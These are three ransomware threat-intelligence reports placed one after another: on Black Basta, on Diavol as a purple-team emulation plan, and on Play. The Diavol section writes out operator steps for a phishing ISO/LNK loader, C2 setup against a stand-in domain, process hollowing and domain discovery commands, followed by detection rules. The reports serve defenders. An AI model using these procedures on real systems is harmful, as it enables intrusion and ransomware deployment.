to July 31, 2022, the group compromised a total of 80 organizations.\n\nThe bulk of Black Basta’ victims were based in North America, which had a victim count of 44, followed by Europe and the Asia-Pacific. More\nspecifically, the US was at the receiving end of most of the attacks, with 38 affected organizations. Many confirmed ransomware attacks also\ntook place in Germany, with 19 victims.\n\n\n\n5/12\n\nFigure 3.

The distribution by country of Black Basta’s victim organizations from April 1 to July 31, 2022\n\nSources: Black Basta’s leak site and Trend Micro’s OSINT research\n\n. . .\n\nBlack Basta’s attacks affected a variety of organizations. Construction businesses topped the list with a victim count of 10, while businesses\ninvolved in professional services came in second with nine victims. Medium-size organizations made up the lion’s share of recorded Black\nBasta victims.\n\n\n\n6/12\n\nFigure 5.

The infection chain\nillustrated below details the variety of tactics and tools the group uses.\n\n\n\n7/12\n\nFigure 7. Black Basta’s infection chain\n\n\n\n\nInitial access\n\nExternal data reports that a user named “Black Basta” posted on underground forums seeking corporate network access credentials,\noffering a share of the profit from their attacks as payment. These reports are supported by the fact that a unique ID is hard-coded in\neach Black Basta build, which could also mean that the ransomware gang does not distribute its malware sporadically.\nOur internal telemetry shows another set of samples, which were monitored within a 72-hour time frame, that were using Qakbot. The\nmalware is downloaded and executed from a malicious Excel file and then executes certain PowerShell commands as part of its staging\nphase\n\n\n\n\nDiscovery\n\nBlack Basta uses PowerShell scripts to scan information about the compromised system or network.\nIt uses Qakbot’s and Cobeacon’s information-gathering capabilities to scan the compromised system or network.\nIt uses third-party tools such as Netcat to scan the compromised system or network.\n\n\n\n\nDefense evasion\n\nBlack Basta uses a batch script containing PowerShell commands to disable antimalware applications.\nIt uses Group Policy Objects (GPOs) to disable Windows Defender and Security Center.\nIt reboots the victim’s computer in safe mode to circumvent any antimalware applications.\n\n\n\n\nPrivilege escalation\n\nBlack Basta exploits the PrintNightmare vulnerability (CVE-2021-34527) to perform privileged operations and deliver the Cobalt Strike\nbeacon (aka Cobeacon) or other payloads.\n\nhttps://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527\n\n\n8/12\n\n\n\n\nCredential access\n\nBlack Basta uses Mimikatz to dump credentials.\n\n\n\n\nLateral movement\n\nBlack Basta uses different tools and pieces of malware to spread its ransomware to other remote systems in the network:\nBITSAdmin\nPsExec \nWindows Management Instrumentation (WMI)\nRDP \nQakbot \nCobeacon \n\n\n\n\nExfiltration\n\nBlack Basta uses Cobeacon to exfiltrate the stolen data on an established command-and-control (C&C) server.\nIt uses Rclone to exfiltrate data from compromised systems.\n\n\n\n\nImpact\n\nBlack Basta uses the ChaCha20 algorithm to encrypt files. The ChaCha20 encryption key is then encrypted with a public RSA-4096 key\nthat is included in the executable.\nMultiple builds of Black Basta ransomware have been found in the wild\n\nOne build restarts the victim’s system in safe mode, most likely for evasion purposes, before performing encryption. This build also\nmodifies the “Fax” service to enable it to run in safe mode and with service-level access.\nAnother build contains only the ransomware’s core capabilities, such as wallpaper defacement, file encryption, and deletion of\nshadow copies.\nA newly found build has a new addition: the -bomb argument, which theoretically allows the ransomware to automatically target all\nconnected machines for encryption.\nThe Linux build of the ransomware targets the folder /vmfs/volumes, where images from virtual machines are contained, for\nencryption.

It has also exhibited\nsimilarities to the Black Matter ransomware gang, including a resemblance between their respective leak sites. Its possible connection to these\nransomware groups might explain the high level of in-house expertise behind Black Basta’s attacks.\n\nIn defending systems against threats like Black Basta, organizations can benefit from establishing security frameworks that can allocate\nresources systematically for establishing solid defenses against ransomware. Here are some best practices that can be included in these\nframeworks:\n\n\n\n\nAudit and inventory\n\nTake an inventory of assets and data.\nIdentify authorized and unauthorized devices and software.\nMake an audit of event and incident logs.\n\n\n\n\nConfigure and monitor\n\nManage hardware and software configurations.\nGrant admin privileges and access only when necessary to an employee’s role.\nMonitor network ports, protocols, and services.\nActivate security configurations on network infrastructure devices such as firewalls and routers.\nEstablish a software allowlist that only executes legitimate applications.\n\n\n\n\nPatch and update\n\nConduct regular vulnerability assessments.\nPerform patching or virtual patching for operating systems and applications.\nUpdate software and applications to their latest versions.\n\n\n\n\nProtect and recover\n\nImplement data protection, backup, and recovery measures.\nEnable multifactor authentication (MFA).\n\n\n\n\nSecure and defend\n\nEmploy sandbox analysis to block malicious emails.\nDeploy the latest versions of security solutions to all layers of the system, including email, endpoint, web, and network.\nDetect early signs of an attack such as the presence of suspicious tools in the system.\nUse advanced detection technologies such as those powered by AI and machine learning.\n\n\n\n\nhttps://www.csoonline.com/article/3669256/black-basta-new-ransomware-threat-aiming-for-the-big-league.html\nhttps://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-conti\nhttps://www.trendmicro.com/en_us/research/22/e/examining-the-black-basta-ransomwares-infection-routine.html\n\n\n12/12\n\nTrain and test\n\nRegularly train and assess employees on security skills.\nConduct red-team exercises and penetration tests.\n\nA multilayered approach can help organizations guard possible entry points into the system (endpoint, email, web, and network).

With you this week we have Nathali Cano\n(CTI), Jorge Orchilles (Attack), and Chris Peacock (Detection Engineer focused on detection\nand response). Big shout out to The DFIR Report for providing the report which served as\nour starting point. We sponsor them and you should too!\n\n \n\nIf you are joining us from the SANS CTI Summit or Cactus Con where Operationalized\nPurple Teaming was presented, welcome! Our Purple Team Exercise Framework that covers\nthe process is available on our GitHub.\n\nCyber Threat Intelligence\n\nThe cyber threat intelligence for this #ThreatThursday is provided by The DFIR Report on\nDiavol Ransomware published December 13, 2021. As usual, we analyze the report, extract\nTTPs at the procedure level, map to MITRE ATT&CK, and build an adversary emulation plan\nthat your organization can leverage to Attack, Detect, and Respond.\n\n \n\nAs is typical in ransomware attacks, we see three different groups at work:\n\n \n\n1. Initial access and execution by an Initial Access Broker. In this case, BazarLoader was\nleveraged to gain initial access using a number of defense evasion techniques\nincluding spearphishing with public OneDrive links, to download a ZIP, containing an\nISO, containing a shortcut (LNK file), that executes rundll32.exe, and then process\ninjection into a more obvious executable, msedge.exe.\n\n2. Manual procedures by a threat actor to perform discovery, credential access,\npersistence, lateral movement, collection, and exfiltration.\n\n3. Ransomware dropped by an affiliate to encrypt files and extort the organization, the\nDiavol ransomware.\n\n \n\nhttps://thedfirreport.com/2021/12/13/diavol-ransomware/\nhttps://github.com/scythe-io/community-threats/tree/master/Diavol\nhttps://www.scythe.io/purple-team-services\nhttps://www.scythe.io/authors/nathali-cano\nhttps://www.scythe.io/about/jorge-orchilles\nhttps://www.scythe.io/authors/christopher-peacock\nhttps://thedfirreport.com/\nhttps://www.patreon.com/thedfirreport/\nhttps://www.scythe.io/ptef\nhttps://github.com/scythe-io/purple-team-exercise-framework\nhttps://www.scythe.io/threatthursday\nhttps://thedfirreport.com/2021/12/13/diavol-ransomware/\nhttps://github.com/scythe-io/community-threats/tree/master/Diavol\n\n\n3/18\n\nThis particular attack leveraged multiple payloads and command and control (C2) servers\nover a 3 day period due to the multiple parties involved. The DFIR Report does a great job\nsummarizing the entire case so we will just post that here for your review:\n\n \n\nThe malware (BazarLoader) was delivered to an endpoint via email, which included a link to\nOneDrive. The OneDrive link, directed the user to download a file that was a zip, which\nincluded an ISO inside. Once opened (mounted) on the users system, it was determined the\nISO contained a LNK file and a DLL. The LNK file masqueraded as a Document enticing the\nuser to click/open it. Once the user executed the LNK file, the BazarLoader infection was\ninitiated.\n\n \n\nAs seen in previous cases, the BazarLoader infection began with internal reconnaissance of\nthe environment using Windows utilities such as net, nltest, and ipconfig. After being inactive\nfor one hour, the intrusion continued with dropping of multiple Cobalt Strike beacon DLL’s on\nthe beachhead. This was followed by another round of discovery from the compromised\nmachine. The threat actor then proceeded with execution of adf.bat, which is a script that\nqueries various Active Directory objects using the AdFind tool. The first run was using a\nrenamed binary named qq.exe and then the threat actor later dropped a properly named\nAdFind binary and executed the same discovery commands again. Soon after that, with the\nuse of another simple batch script named fodhelper_reg_hashes.bat, they performed\ncredentials acquisition via dumping of SAM, SECURITY and SYSTEM registry hives.\n\n \n\nReturning after a gap of almost 18 hours, the threat actor performed another round of\nnetwork scanning from the beachhead. This was then followed by attempts to Kerberoast\nand “AS-REProast” using the tool Rubeus. The threat actor then moved laterally via RDP to\na server that contained file shares. After gaining access to the system they installed a remote\naccess application, AnyDesk, as well as Filezilla.\n\n \n\nThe threat actors used FileZilla to exfiltrate data out of the environment. They then pivoted\ntowards critical systems, such as domain controllers and a server that held backups. The\nthreat actor then dumped LSASS from one of the domain controllers, using task manager,\nand then uploaded the dump file to ufile.io using Internet Explorer.\n\n \n\n\n\n4/18\n\nOn the backup server, the threat actors attempted to dump databases associated with the\nbackup solution. In one attempt, they used a documented technique to recover the encoded\npassword and decode it using the Microsoft Data Protection API (DPAPI).\n\n \n\nAfter around 42 hours post initial intrusion, the threat actors pushed towards completion of\ntheir final objective. RDP access was established from the central file server that the threat\nactors had compromised to all endpoints and a batch script named “kill.bat” was executed on\nall of the targeted machines.\n\n \n\nThe script consists of commands that removes Volume Shadow copies, disables Windows\nautomatic startup repair, and stops all the running services on the host. Once the script\ncompleted execution, the Diavol Ransomware was deployed via the RDP connection on\neach machine by running the executable manually. From initial access, to ransomware\ndeployment, the threat actors took about 42 hours to deploy ransomware domain wide, but\nfrom the login on the third day, to the last host ransom execution, only about an hour passed\nfor the actors to finish their deployment.\n\n \n\nThe DFIR Report also maps to MITRE ATT&CK and provides the mapping at the bottom of\nthe report:\n\nSpearphising Link – T1566.002\nBITS Jobs – T1197\nKerberoasting – T1558.003\nAS-REP Roasting – T1558.004\nCredentials in Registry – T1552.002\nRemote Desktop Protocol – T1021.001\nExfiltration to Cloud Storage – T1567.002\nOS Credential Dumping – T1003\nSMB/Windows Admin Shares – T1021.002\nSystem Owner/User Discovery – T1033\nNetwork Service Scanning – T1046\nProcess Injection – T1055\nPowerShell – T1059.001\nDomain Groups – T1069.002\nFile and Directory Discovery – T1083\nAccess Token Manipulation – T1134\nNetwork Share Discovery – T1135\nDomain Trust Discovery – T1482\n\n\n\n5/18\n\nData Encrypted for Impact – T1486\nDisable or Modify Tools – T1562.001\nValid Accounts – T1078\n\n \n\nThis is all fantastic and shows the evolution of Cyber Threat Intelligence from Indicators of\nCompromise (IoCs) to Indicators of Behaviors (IoBs). However, MITRE ATT&CK mapping is\nat the technique level and we need procedure level information to emulate the adversary and\nperform detection engineering. This is a major gap we continue to see in most CTI providers.\nLucky for all of us, The DFIR Report does provide procedure level information in the report.\n\nExtracting procedure level CTI\n\nOur next step is extracting procedure level CTI that is actionable for Attack, Detect, and\nRespond. We work together as an internal purple team to map the CTI to Tactic, Technique,\nProcedure and the procedure we are capable of as the attacker. Procedure level information\nis often missing and we have to be creative in the procedure we perform to most closely\nemulate the adversary.\n\n \n\nLet’s do an example together. The first paragraph from The DFIR Report summary states:\n\n \n\nThe malware (BazarLoader) was delivered to an endpoint via email, which included a link to\nOneDrive. The OneDrive link, directed the user to download a file that was a zip, which\nincluded an ISO inside. Once opened (mounted) on the users system, it was determined the\nISO contained a LNK file and a DLL. The LNK file masqueraded as a Document enticing the\nuser to click/open it. Once the user executed the LNK file, the BazarLoader infection was\ninitiated.\n\n \n\nWe convert this over to Tactic, Technique, Procedure, and then Red Team Procedure. In this\ncase, we will be emulating with SCYTHE so we are adding the exact steps:\n\n \n\nWe continued extracting procedures and building out the adversary emulation plan\nprocedure per procedure. Given the multiple payloads used, we had to understand the timing\nand execution of each procedure to more accurately build the adversary emulation plan. Our\nGoogle Sheet is available here if you would like to take a look at the entire multi-stage attack.\n\nhttps://docs.google.com/spreadsheets/d/136SX5rxqmSlYSgK9Id_GDA7toMzMh-dwzEGxDGIgIUU/edit?usp=sharing\n\n\n6/18\n\nEmulating the Attack\n\nThis is a multi-stage attack leveraging multiple payloads and execution that performs\nnumerous different TTPs. Manual emulation steps are below and automated steps for\nSCYTHE users are available in our Community Threats GitHub. In this post we will focus on\nStage 0 and the dropping of Stage 1 through Process Hollowing.\n\nDiavol Stage 0\n\nThe initial access stage of this campaign leveraged multiple defense evasion procedures to\ndrop BazarLoader. From the attacker perspective, we start in a different procedure than the\nCTI and Incident Response observed; we must first set up the Command and Control\ninfrastructure. With SCYTHE, it is very easy to start a new campaign so we will skip those\nsteps and begin right at downloading the payload.\n\n \n\n1. Start a campaign using the following communication parameters `--cp\nyourdomain[.]com:443 --secure true --multipart 10240 --heartbeat 5 --jitter 10`,\ndownload the DLL and set the entry point of `BasicScore` and save it as\n`ShareFiles.dll`\n\nhttps://github.com/scythe-io/community-threats/tree/master/Diavol\n\n\n7/18\n\n1. Copy the src folder from our Compound Actions GitHub for T1553.005 to a working\ndirectory on your Windows system.\n\n2. Put the SCYTHE DLL in the Folder2Iso of the working directory.\n3. In the Folder2Iso directory, create a shortcut called `Documents` and set the `Target`\n\nto: `C:\\Windows\\System32\\rundll32.exe SharedFiles.dll,BasicScore`\n\nhttps://github.com/scythe-io/compound-actions/tree/main/T1553.005%20-%20Mark-of-the-Web%20Bypass/src\n\n\n8/18\n\n1. Open a Windows command prompt and `cd` to the working directory.\n2. Run `Folder2Iso.exe \"Folder2Iso\" \"%USERPROFILE%\\Downloads\\new-documents-\n\n2005.iso\" \"Diavol\" 0 0 0 \"None\"` This will take all the content of the Folder2Iso folder\nand create an ISO of it.\n\n3. Zip the ISO and call it `new-documents-2005.zip`\n4. Upload the zip file to Microsoft OneDrive and copy the link.\n5. Send a phishing email with the link to the Microsoft OneDrive zip file.\n6. If the end user downloads the ZIP and double clicks the ISO, it will be mounted on their\n\nendpoint. The user will need to double click the shortcut to begin execution.\n\n \n\nOnce the shortcut is executed, a new client will connect to the SCYTHE server. As we are\nmanually emulating this activity, you will need to create the Diavol Stage 1 campaign first,\ndownload the EXE and upload it to the Virtual File System under\n\n\n\n9/18\n\nVFS:/shared/Diavol/DiavolStage1.exe\n\n \n\nThe last steps of Diavol Stage 0 are performing process injection into Microsoft Edge. The\nCTI does not provide procedure level details as to how process injection occurred: “The\nthreat actors made use of process injection through-out the intrusion. The BazaLoader\nmalware injected into an Edge browser process, as observed by the discovery activity”.\n\n \n\nWe know process injections maps to MITRE ATT&CK Technique T1055 but that technique\nhas 11 sub-techniques. This is an example where the red team will need to be creative and\nimprovise on which procedure to use. In our case, we are going to go with Process Hollowing\n T1055.012 to attempt to continue evading detection. Process hollowing is performed by\nstarting a process in a suspended state, unmapping (hollowing) its memory, and replacing it\nwith our payload.\n\n \n\n1. Load the process hollowing module: ```loader --load scythe.phollowing```\n2. Inject DiavolStage1 into msedge: ```scythe.phollowing --src\n\nVFS:/shared/Diavol/DiavolStage1.exe --target \"C:\\Program Files\n(x86)\\Microsoft\\Edge\\Application\\msedge.exe\"```\n\n3. Shutdown Diavol Stage 0: ```controller --shutdown```\n\nDiavol Stage 1\n\nManual execution of discovery activity started 14 minutes after initial access:\n\n```\n\nloader --load run\n\nrun net group /domain\n\nrun net group /domain \"Domain Admins\"\n\nrun net group \"Domain Computers\" /domain\n\nrun net localgroup administrators\n\nrun net view /all\n\nrun nltest /domain_trusts /all_trusts\n\n```\n\nhttps://attack.mitre.org/techniques/T1055/\nhttps://attack.mitre.org/techniques/T1055/012/\n\n\n10/18\n\n59 minutes after discovery, another payload was dropped and executed:\n\n```\n\nloader --load downloader\n\ndownloader --src \"VFS:/shared/Diavol/tfpkuengdlu.dll\" --dest\n\"%USERPROFILE%\\AppData\\Local\\Temp\\tfpkuengdlu.dll\"\n\nrun rundll32.exe \"%USERPROFILE%\\AppData\\Local\\Temp\\tfpkuengdlu.dll\",EnterDll\n\ncontroller --shutdown\n\n```\n\nDetection Opportunities\n\n \n\nThere are multiple detection opportunities along the kill chain. The delivery phase is complex\ndue to ZIP files commonly being downloaded from cloud vendors. Therefore, it is\nrecommended to leverage decryption at your firewalls and sandbox these files on their\ningress. We’ll cover the detection opportunities that follow the ZIP delivery and begin with it\nbeing unzipped.\n\n \n\nDiavol Stage 0 Detections\n\nTo summarize this stage, the threat actor is trying to get their stager into an environment,\nhave a user execute the stager, and then have the stager process inject the payload via\nprocess hollowing into Microsoft Edge. If you’re mapping to the Kill Chain, this would be the\nDelivery, Exploitation, and Installation phases. It’s important to note that exploitation isn’t\nalways a technical exploit, but in cases such as this, it can be human exploitation to get code\nexecution.\n\nNew ISO File\n\nWhen the ZIP file is decompressed, it will write the ISO file. ISO files are uncommon for\nworkers outside of IT Administration. Therefore, we recommend alerting on new ISO files for\nworkers outside of IT. Depending on your monitoring tool, you can filter by users,\nworkstations, or groups. Below is an example of the file write event from unzipping the ZIP\nfile.\n\n \n\n\n\n11/18\n\n \n\nMounting of an ISO\n\nIf we cannot catch the new ISO, the following detection opportunity is to catch the malicious\nISO being mounted. Once again filtering will have to be conducted for those users,\ncomputers, or groups where software installation is typical. We recommend the SIGMA ISO\nImage Mount Rule to detect this using Windows Security Logs. Please note there is an\nadvanced audit policy to adjust for this to be logged.\n\n \n\nRundll32\n\nThere are multiple detection opportunities around runddl32 in this plan, and we’ll address\nthem in a layered alert approach. Some may be simple to implement in your environment,\nwhile others may be more difficult but offer greater detection value.\n\n \n\nCommand Line Contains Rundll32\n\nWhen actors conduct this technique, they pass a command that calls rundll32 and points it at\na malicious dll they’ve crafted. In our example, the command was\n“C:\\Windows\\System32\\rundll32.exe” SharedFiled.dll,BasicScore. So, we look for any\ncommand line that contains the string rundll32.exe. We can baseline this in the environment\nand alert when new suspicious events occur. To help generate fields to baseline, we\nrecommend using the Rundll32 Without Parameters SIGMA Rule for this detection logic. If\nunable to baseline, the organization can hunt for rare occurrences instead. Below we can\nsee our emulation command at the top of our search and may decide to alert anytime\nsvchost.exe is not the Parent Image.\n\n \n\nhttps://github.com/SigmaHQ/sigma/blob/04f72b9e78f196544f8f1331b4d9158df34d7ecf/rules/windows/builtin/security/win_iso_mount.yml\nhttps://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_rundll32_without_parameters.yml\n\n\n12/18\n\n \n\nRundll32 with Parent Process of Explorer.exe\n\nDue to the execution coming from clicking the LNK file, the parent process of rundll32.exe is\nexplorer.exe. This parent-child relationship is uncommon, though each environment is unique\nand may need baselining. As you can see below, our environment had no previous events\nfor this alert logic before testing.\n\n \n\n \n\nRundll32 with Abnormal Current Directory\n\n \n\nIt’s very unusual to see rundll32 being executed from a drive other than the C: drive.\nTherefore we can write a detection to look for a process of rundll32.exe with a current\ndirectory other than the C drive. Therefore, searching for a process of rundll32.exe with a\ncurrent directory not containing “C:\\” resolved only in true positives, as shown below.  We’ve\nalso submitted the logic to SIGMA for incorporation.\n\nhttps://github.com/SigmaHQ/sigma/pull/2605/commits/076b0c92467cc6a3f1eedad11e99169969523d72\n\n\n13/18\n\n \n\nRundll32 with Network Connection\n\n \n\nEvery environment is unique; therefore, there are different ways you may implement this\nlogic that works for you. The easiest way to implement this is to search for a process of\nrundll32.exe making a network connection. In our example, we searched for rundll32.exe\nand the field destination IP exists. Our 30 day search only returned true positives to our\ninternal SCYTHE Server, as you can see below.\n\n \n\n \n\nIf you have too much internal traffic to tune, you may want to start with just catching\noutbound connections. For this, we recommend starting with the SIGMA Rundll32 Internet\nConnection rule.\n\n \n\nhttps://github.com/SigmaHQ/sigma/blob/eb382c4a59b6d87e186ee269805fe2db2acf250e/rules/windows/network_connection/sysmon_rundll32_net_connections.yml\n\n\n14/18\n\nProcess Hollowing Detection\n\n \n\nAn EDR should detect this. It’s worth noting, though, if the alert is responded to by an analyst\nor not. Suppose there are too many false positives for the process hollowing alert generated\nby this emulation. In that case, you should seek to baseline the alert for your environment so\nit may be responded to. If you are layering an EDR with Sysmon or only running Sysmon,\nyou must implement logic. First, you will need to ensure that Sysmon and its configuration\nare up to date, as this functionality was released in 2021 in Sysmon 13. See  Microsoft\nSysmon now detects malware process tampering attempts. Once you collect the appropriate\ntelemetry, the detection logic is to alert on an event code of 25 with a Type of Image is\nreplaced. This will detect when an in-memory process image does not match the disk image\nbecause the process hollowing replaces it. At the time of this writing, we have submitted this\nlogic to SIGMA and it should be available here as sysmon_process_hollowing.yml shortly, if\nnot already.\n\n \n\n \n\nDiavol Stage 1 Detections\n\nThis stage is where the threat actor enumerates the environment. Now that the actor has\ninjected the payload process, common enumeration commands are conducted leveraging\nnet and nltest commands. If you are mapping to the Kill Chain, this would be where the actor\nhas gotten to Actions on Objectives as they are actively running commands on target. You\ncan see the commands laid out in the SCYTHE screenshot below.\n\n \n\nhttps://www.bleepingcomputer.com/news/microsoft/microsoft-sysmon-now-detects-malware-process-tampering-attempts/\nhttps://github.com/SigmaHQ/sigma/tree/master/rules/windows/sysmon\n\n\n15/18\n\n \n\nSuspicious Net Commands\n\nThe commands conducted by the adversary and the emulation plan are commonly seen in\nBazarLoader and ransomware attacks. These commands are indicative of enumerating the\nenvironment a threat actor is operating in. To detect this enumeration activity we recommend\nthe Net.exe Execution SIGMA Rule. The logic is looking for net.exe or net1.exe with a\ncommand line containing strings of group, localgroup, user, view, share, accounts, stop, or\nstar.  In the image below, all commands in steps three through seven were picked up by the\nrule search.\n\n \n\nhttps://github.com/SigmaHQ/sigma/blob/777d218adc789b7f1b146701793e78799324d87d/rules/windows/process_creation/win_susp_net_execution.yml\n\n\n16/18\n\n \n\nSuspicious Nltest Commands\n\nFor detecting the domain trust enumeration conducted in step 8, we recommend the SIGMA\nRecon Activity with NLTEST Rule and provide a screenshot of it below. Depending on your\nenvironment, it may be possible for you to baseline and flag on any nltest.exe execution. It’s\nworth noting the Domain Trust Discovery SIGMA Rule is also applicable.\n\n \n\n \n\nRespond\n\n \n\nhttps://github.com/SigmaHQ/sigma/blob/05c58b4892942c34bfa01e9ada88ef2663858e1c/rules/windows/process_creation/win_nltest_recon.yml\nhttps://github.com/SigmaHQ/sigma/blob/11164849b3595a427c4ee9c5fe8ccfa3d78aa989/rules/windows/process_creation/win_trust_discovery.yml\n\n\n17/18\n\nIf any of the alerts are detected in the environment, the response team should determine the\ndepth of the Kill Chain, collect artifacts, and answer the following questions:\n\n \n\nWas the installation successful?\n\nWhat are the persistent mechanisms?\n\n \n\nIs Command & Control (C2) successful?\n\nWhat are the domain names, IP addresses, ports and protocols used?\n\n \n\nAre there observations of Actions on Objectives (AOO)?\n\nIf so, what are they?\nDid it move to other hosts?\nWas any sensitive data taken?\n\nUsernames?\nPasswords?\nOther?\n\n \n\nWhat was the infection vector?\n\nHow was it delivered?\nWhat exploitation led to installation?\n\n \n\nOnce it has been determined how deep the intrusion goes, containment, eradication, and\nrecovery should begin.  After recovery, lessons learned should drive additional courses of\naction (COAs) to thwart the threat should it return, such as implementing additional security\ncontrols. As always, please follow your organization's response plan and evidence retention\npolicies. We also recommend leveraging NIST SP 800-61 Rev. 2.\n\nConclusion\n\nOur internal purple team took the cyber threat intelligence from The DFIR Report, extracted\nthe procedures mapped to ATT&CK, built and shared an adversary emulation plan, emulated\nthe attack, and covered multiple detection opportunities. This was a multi-stage attack with 3\n\nhttps://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf\n\n\n18/18\n\ndifferent threat actors working together to gain initial access, propagate through the\nenvironment, and leverage the Diavol ransomware for double extortion. We would like to\nthank The DFIR Report for the detailed reporting. The procedure-level ATT&CK mapping and\nplan is available on this Google Sheet if you would like to take a look at the entire multi-stage\nattack planning phase. Lastly, manual and automated emulationation steps are available to\nthe community on GitHub.\n\n \n\nAuthors: Jorge Orchilles, Chris Peacock, Nathali Cano\n\n \n\nhttps://thedfirreport.com/2021/12/13/diavol-ransomware/\nhttps://docs.google.com/spreadsheets/d/136SX5rxqmSlYSgK9Id_GDA7toMzMh-dwzEGxDGIgIUU/edit?usp=sharing\nhttps://github.com/scythe-io/community-threats/tree/master/Diavol",

Play ransomware’s ransom note\n\nIn July, we investigated a spate of ransomware cases in the Latin American region that targeted government entitles, which was initially\nattributed to a new player known as Play ransomware. This ransomware’s name was derived from its behavior, as it adds the extension “.play”\nafter encrypting files. Its ransom note also contains the single word, “PLAY,” and the ransomware group’s contact email address (Figure 1).\nVictims of this ransomware first surfaced in Bleeping Computer forums in June 2022. A month later, more details about Play ransomware were\npublished on the “No-logs No breach” website. \n\nFurther analysis of these ransomware infections, however, revealed that Play uses many tactics that follow the playbook of both Hive and\nNokoyawa ransomware (Tables 1 and 2), including similarities in the file names and file paths of their respective tools and payloads. Earlier\nthis year, we found evidence that suggests that the attackers behind Nokayawa are related to those behind Hive, owing to the many similarities\nbetween their attack chains.\n\nNotably, one behavior that sets Play ransomware apart from Hive and Nokoyawa is its use of AdFind, a command-line query tool capable of\ncollecting information from Active Directory (AD), as means of discovery (Figure 2). Hive, on the other hand, has been observed using tools\nlike the TrojanSpy.DATASPY trojan to gather information in a victim’s system.\n\nIndicator  Purpose   Nokoyawa and Hive ransomware    Play ransomware \n\nNekto/PriviCMD  Privilege escalation ✓ ✓\n\nCobalt Strike Staging  ✓ ✓\n\nCoroxy/SystemBC Remote access ✓ ✓\n\nGMER  Defense evasion ✓ ✓\n\nPCHunter  Discovery and defense evasion ✓  \n\nAdFind  Discovery    ✓\n\nPowerShell scripts Discovery ✓  \n\nPsExec  Lateral deployment of ransomware ✓ ✓\n\nTable 1.

Play ransomware’s use of AdFind\n\nRelated Malware Campaigns\n\nThough not all of the Play ransomware infections that we analyzed shared malware indicators with that of Hive and Nokoyawa ransomware,\ntheir many shared tactics and tools suggest a high probability of affiliation between these ransomware families. This ransomware merits further\ninvestigation, and we plan on validating the related URLs from Play ransomware infections in terms of watermarking. This is to determine\nwhether these were indeed related to any Hive infections in the past, as was done previously with Nokoyawa infections.\n\nAdditionally, we have found evidence that points to a possible connection between Play ransomware and Quantum ransomware, which is an\noffshoot of the notorious Conti ransomware group. The Cobalt Strike beacons that were used in Play's attacks bear the same watermark,\n206546002, as those previously dropped by Emotet and SVCReady botnets that have also been observed in Quantum ransomware attacks.\nThis suggests that the two ransomware groups share some of the same infrastructure.\n\nDuring our investigation, we found indicators of a good chance of an Emotet infection. Though there are currently no spam campaigns using\nthe Emotet trojan, we did detect a few cases of Emotet being used to deploy Cobalt Strike beacons bearing the same 206546002 watermark\nthat was found in beacons involved in Play's ransomware attacks.\n\nInfection Routine\n\nThe malware authors behind Play ransomware have been known to use compromised valid accounts or exploit unpatched Fortinet SSL VPN\nvulnerabilities to gain access to an organization’s network (Figure 3). Like most modern ransomware, Play uses living-off-the-land binaries\n(LOLBins) as part of its attacks: For example, it uses the remote tool WinSCP for data exfiltration, and Task Manager for Local Security\nAuthority Server Service (LSASS) process dumping and credential cracking.\n\nPlay ransomware also uses double extortion techniques against its victims. In its attacks, data exfiltration is performed prior to the deployment\nof the ransomware: It archives a victim’s files using WinRAR and then uploads the files to sharing sites. The ransomware executable is\ndistributed via Group Policy Objects (GPO), then run using scheduled tasks, PsExec or wmic.\n\nhttps://www.bleepingcomputer.com/news/security/quantum-ransomware-attack-disrupts-govt-agency-in-dominican-republic/\nhttps://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-conti\n\n\n3/6\n\nFigure 3. Play ransomware’s infection chain\nInitial Access\n\nPlay’s ransomware actors commonly gain initial access through valid accounts that have been reused across multiple platforms, have\npreviously been exposed, or were obtained through illegal means. This includes Virtual Private Network (VPN) accounts, not just domain and\nlocal accounts. Exposed RDP servers are also abused to establish a foothold. Another technique Play ransomware uses is the exploitation of\nthe FortiOS vulnerabilities CVE-2018-13379 and CVE-2020-12812.\n\nCVE-2018-13379 is a path traversal vulnerability in the FortiOS SSL VPN web portal that allows an unauthenticated attacker to download OS\nsystem files through specially crafted HTTP resource requests.  On the other hand, CVE-2020-12812 is an improper-authentication\nvulnerability in SSL VPN in FortiOS, which allows a user to log in without being prompted for FortiToken, the second factor of authentication, if\nthey changed the case of their username.\n\nExecution\n\nWe observed Play ransomware’s usage of scheduled tasks and PsExec during its execution phase. Another one of Play’s techniques involves\nthe creation of a GPO, as GPOs are able to control many user and machine settings in the AD. The GPO deploys a scheduled task across the\nAD environment, and the task executes the ransomware at a specific date and time.  \n\nThe ransomware also uses batch files to execute PsExec, a legitimate Windows tool in the SysInternals suite. This tool’s ability to execute\nprocesses on other systems allows the rapid spread of the ransomware and assists Play in its reconnaissance activities.\n\nPersistence\n\nAfter the Play ransomware actors gain initial access through valid accounts, they will continue to use these accounts as a persistence\nmechanism. If Remote Desktop Protocol (RDP) access is disabled in a victim’s system, the malicious actors will enable it by executing “netsh”\ncommands so that they can establish inbound connections within a victim’s system. The ransomware executable is dropped in the Domain\n\nhttps://nvd.nist.gov/vuln/detail/CVE-2018-13379\nhttps://nvd.nist.gov/vuln/detail/CVE-2020-12812\n\n\n4/6\n\nController shared folders (NETLOGON or SYSVOL) and is run by a scheduled task/PsExec, after which encryption of the victim’s files takes\nplace. \n\nPrivilege Escalation\n\nPlay ransomware uses Mimikatz to extract high privileges credentials from memory. Afterward, the ransomware will add accounts to privileged\ngroups, one of which is the Domain Administrators group. It performs vulnerability enumeration through Windows Privilege Escalation\nAwesome Scripts (WinPEAS), a script that searches for possible local privilege escalation paths.\n\nDefense Evasion\n\nThe ransomware uses tools such as Process Hacker, GMER, IOBit, and PowerTool to disable antimalware and monitoring solutions. It covers\nits tracks using the Windows built-in tool wevtutil or a batch script, which will remove indicators of its presence, such as logs in Windows Event\nLogs or malicious files. It disables Windows Defender protection capabilities through PowerShell or command prompt. The PowerShell scripts\nthat Play ransomware uses, like Cobalt Strike beacons (Cobeacon) or Empire agents, are encrypted in Base64.\n\nCredential Access\n\nPlay ransomware also uses Mimikatz to dump credentials. The tool can be dropped directly on the target host or executed as a module\nthrough a command-and-control (C&C) application like Empire or Cobalt Strike. We also observed the malware’s use of the Windows tool Task\nManager to dump the LSASS process from memory.\n\nDiscovery\n\nDuring the discovery phase, the ransomware actors collect more details about the AD environment. We’ve observed that AD queries for\nremote systems have been performed by different tools, such as ADFind, 